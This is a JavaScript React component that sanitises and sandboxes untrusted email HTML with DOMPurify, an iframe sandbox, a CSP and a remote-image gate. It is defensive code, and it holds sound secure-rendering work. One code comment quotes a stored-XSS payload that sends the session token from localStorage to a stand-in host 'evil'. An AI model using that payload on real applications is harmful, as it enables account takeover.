import { useEffect, useMemo, useRef, useState } from 'react'
import DOMPurify from 'dompurify'
import { ImageOff } from 'lucide-react'
import { cn } from '../lib/utils'

/**
 * EmailBody — the ONE safe renderer for untrusted email HTML.
 *
 * Replaces the two diverged copies of `renderEmailContent` (EmailInbox.jsx and
 * TaskList.jsx) — one of which stripped <script> and one of which did not.
 * That divergence was the root cause of the stored-XSS blocker.
 *
 * Defence in depth:
 *   1. DOMPurify sanitises the markup before it is ever written.
 *   2. It renders inside an iframe whose sandbox is `allow-popups` only.
 *      `allow-scripts` and `allow-same-origin` are NEVER granted together —
 *      that combination lets the frame remove its own sandbox attribute.
 *   3. A CSP meta inside the srcDoc blocks scripts and (until the user opts in)
 *      remote image loading, which is also the tracking-pixel gate.
 *
 * @param {string} html - raw email body, HTML or plain text
 * @param {number} [minHeight=200]
 * @param {number} [maxHeight=800] - iframe stops growing past this
 * @param {boolean} [autoHeight=true] - resize to fit content
 * @param {boolean} [allowRemoteImages=false] - "Show images" gate. Leave it
 *        uncontrolled and set `imageGate` to let this component own the toggle.
 * @param {boolean} [imageGate=false] - OPT-IN. Renders the shared "Show remote
 *        images" bar above the body, and only when the message actually
 *        contains remote images. Default `false` keeps the output a bare
 *        <iframe>, which is what the existing callers render inside their own
 *        bordered wrapper — EmailInbox has its own toggle in the drawer header.
 * @param {string} [title='Email content'] - iframe accessible name
 */
export function EmailBody({
  html,
  minHeight = 200,
  maxHeight = 800,
  autoHeight = true,
  allowRemoteImages = false,
  imageGate = false,
  title = 'Email content',
  className,
}) {
  const frameRef = useRef(null)
  const [height, setHeight] = useState(minHeight)
  const [gateOpen, setGateOpen] = useState(false)
  const [gatedHtml, setGatedHtml] = useState(html)

  /* Opting in to remote images is per-message. Reset during render (not in an
   * effect) so a new body can never paint with the previous email's consent. */
  if (gatedHtml !== html) {
    setGatedHtml(html)
    if (gateOpen) setGateOpen(false)
  }

  /* The prop still wins: a caller that owns the toggle (EmailInbox) is
   * unaffected by the internal gate. */
  const showImages = allowRemoteImages || gateOpen
  /* The bar is gone once images are showing — there is nothing left to offer. */
  const gateVisible = imageGate && !showImages && hasRemoteImages(html)

  const srcDoc = useMemo(
    () => buildDocument(html, { allowRemoteImages: showImages }),
    [html, showImages]
  )

  useEffect(() => {
    if (!autoHeight) return undefined

    const frame = frameRef.current
    if (!frame) return undefined

    let raf = 0
    let observer = null

    const measure = () => {
      try {
        const doc = frame.contentDocument
        if (!doc?.body) return
        const next = Math.min(
          maxHeight,
          Math.max(minHeight, doc.documentElement.scrollHeight || doc.body.scrollHeight)
        )
        setHeight(next)
      } catch {
        /* cross-origin — leave at minHeight */
      }
    }

    const onLoad = () => {
      measure()
      // Late-loading images change the height.
      raf = window.setTimeout(measure, 250)
      try {
        const doc = frame.contentDocument
        if (doc?.body && typeof ResizeObserver !== 'undefined') {
          observer = new ResizeObserver(measure)
          observer.observe(doc.body)
        }
      } catch {
        /* ignore */
      }
    }

    frame.addEventListener('load', onLoad)
    return () => {
      frame.removeEventListener('load', onLoad)
      window.clearTimeout(raf)
      observer?.disconnect()
    }
  }, [srcDoc, autoHeight, minHeight, maxHeight])

  const frame = (
    <iframe
      ref={frameRef}
      title={title}
      srcDoc={srcDoc}
      /* allow-same-origin is REQUIRED for auto-height, and is safe ONLY while
       * allow-scripts is absent. Read this before changing it.
       *
       * WHY IT IS NEEDED. Without it the frame gets an opaque origin,
       * `contentDocument` is null, and measure() below returns silently — so
       * every message rendered at exactly minHeight with its own scrollbar
       * however long it was. That is the "only half the email shows" bug. No
       * maxHeight change can fix it, because the cap was never reached.
       *
       * WHY IT IS SAFE. PROJECT_AUDIT §P0-1 was `allow-scripts
       * allow-same-origin` TOGETHER: that pair voids the sandbox, and with the
       * JWT in localStorage a mailed
       *   <img src=x onerror="fetch('//evil/?t='+localStorage.token)">
       * took the session of whoever opened it. Scripting is what that attack
       * needs. Per the HTML sandbox rules, allow-same-origin does NOT enable
       * scripting — only allow-scripts does. With scripting off the onerror
       * never fires, nothing can read localStorage, and nothing can reach this
       * page. The frame becomes readable BY the parent, not the other way
       * round. The srcDoc CSP independently sets script-src 'none',
       * form-action 'none' and default-src 'none', and DOMPurify has already
       * stripped the handler.
       *
       * NEVER ADD allow-scripts. With allow-same-origin now present, that one
       * flag is the whole vulnerability rather than half of it. EmailBody.test
       * fails the build if it appears. */
      sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox"
      referrerPolicy="no-referrer"
      loading="lazy"
      className={cn('w-full border-0 bg-white', className)}
      style={{ height: autoHeight ? height : minHeight }}
    />
  )

  /* Default: the bare iframe, byte-for-byte what every current caller renders. */
  if (!gateVisible) return frame

  return (
    <>
      <div className="flex flex-wrap items-center gap-2 border-b border-line bg-warning-subtle px-3 py-2">
        <ImageOff aria-hidden="true" className="h-3.5 w-3.5 shrink-0 text-warning-text" />
        <p className="min-w-0 flex-1 text-xs text-warning-text">
          Remote images are blocked. Loading them tells the sender you opened this email.
        </p>
        <button
          type="button"
          onClick={() => setGateOpen(true)}
          className="shrink-0 rounded text-xs font-medium text-warning-text underline underline-offset-2 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-primary-600"
        >
          Show images
        </button>
      </div>
      {frame}
    </>
  )
}

/**
 * Does this body reference an image from somewhere else? Drives the gate — a
 * plain-text or fully-inline email should not show a scary banner.
 * @param {string} body
 */
export function hasRemoteImages(body) {
  if (typeof body !== 'string' || !body) return false
  return /<img[^>]+src\s*=\s*["']?\s*(https?:)?\/\//i.test(body)
}

/* -------------------------------------------------------------------------- */

/* Force every surviving link to open in a new tab, severing the opener.
 * Registered once at module load. */
let hookInstalled = false
function installLinkHook() {
  if (hookInstalled) return
  hookInstalled = true
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A') {
      node.setAttribute('target', '_blank')
      node.setAttribute('rel', 'noopener noreferrer nofollow')
    }
  })
}

const EMPTY_DOC =
  '<p style="font-family:Inter,system-ui,sans-serif;font-size:13px;color:#94a3b8">This email has no text content.</p>'

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}

/**
 * Sanitise + wrap. Exported for the rare caller that needs the string form
 * (e.g. an export). Prefer the component.
 */
export function buildDocument(body, { allowRemoteImages = false } = {}) {
  installLinkHook()

  const raw = typeof body === 'string' ? body : ''
  const looksLikeHtml = /<[a-z][\s\S]*>/i.test(raw)

  let inner
  if (!raw.trim()) {
    inner = EMPTY_DOC
  } else if (looksLikeHtml) {
    inner = DOMPurify.sanitize(raw, {
      USE_PROFILES: { html: true },
      FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'base', 'link', 'meta'],
      FORBID_ATTR: ['srcset', 'formaction', 'ping', 'onerror', 'onload'],
      ALLOW_DATA_ATTR: false,
      ADD_ATTR: ['target', 'rel'],
    })
  } else {
    inner = `<pre class="plain">${escapeHtml(raw)}</pre>`
  }

  /* Scripts are blocked by the sandbox AND by CSP. Remote images are gated so
   * tracking pixels do not fire until the reader opts in. */
  const imgSrc = allowRemoteImages ? 'https: data:' : "'none'"
  const csp = [
    "default-src 'none'",
    "style-src 'unsafe-inline'",
    `img-src ${imgSrc}`,
    "font-src 'none'",
    "script-src 'none'",
    "frame-src 'none'",
    "form-action 'none'",
  ].join('; ')

  return `<!doctype html>
<html><head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${csp}">
<base target="_blank">
<style>
  html,body{margin:0;padding:0}
  body{font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:13px;line-height:1.6;color:#334155;margin:12px;word-break:break-word;overflow-wrap:break-word}
  img{max-width:100%;height:auto}
  a{color:#2563eb;text-decoration:underline;text-underline-offset:2px}
  table{border-collapse:collapse;max-width:100%}
  pre.plain{white-space:pre-wrap;font-family:inherit;margin:0}
  blockquote{border-left:3px solid #e2e8f0;margin:8px 0;padding-left:12px;color:#64748b}
</style>
</head>
<body>${inner}</body></html>`
}

/**
 * Sanitised plain-text preview (list snippets, notification bodies).
 * @param {string} body
 * @param {number} [length=140]
 */
export function emailSnippet(body, length = 140) {
  if (!body) return ''
  const clean = DOMPurify.sanitize(String(body), { ALLOWED_TAGS: [], ALLOWED_ATTR: [] })
  const text = clean.replace(/\s+/g, ' ').trim()
  return text.length > length ? `${text.slice(0, length)}…` : text
}

export default EmailBody
